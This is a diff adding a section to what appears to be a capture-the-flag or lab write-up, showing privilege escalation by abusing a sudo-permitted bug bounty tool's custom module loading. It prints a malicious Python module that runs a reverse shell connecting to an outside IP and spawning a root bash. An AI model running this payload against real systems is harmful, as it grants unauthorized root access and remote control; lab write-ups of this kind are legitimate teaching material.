@@ -232,6 +232,26 @@ public class CustomFunctions {
 
 ----------------
 
+- I checked if user `graphasm` can run a binary with as root with `sudo -l`.I discovered the graphasm can do that with `bbot` binary.
+
+![image](https://github.com/user-attachments/assets/92e40bcf-c2f9-4785-bc9b-f4fa06b92bf9)
+
+- Bbot is a bug bounty tool for enumeration.I dived into the documentation to check for features that we can use for privilege escalation e.g file write.file read and scripts code execution.Then, I discovered this feature that allows us load custom modules.
+This [article](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) in the documentation explains how to go about it.We can abuse this feature to execute code.The malicious module is named `dirty` and the code snippet is the poc.It imports `os` and uses the `system()` function to trigger a python reverse shell.
+
+```python
+import os
+from bbot.modules.base import BaseModule
+
+payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.84\",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
+class dirty(BaseModule):
+     print("I ran your dirty exploit,sensei!!!!")
+     os.system(payload)
+```
+
+- 
+
+
 
 
 
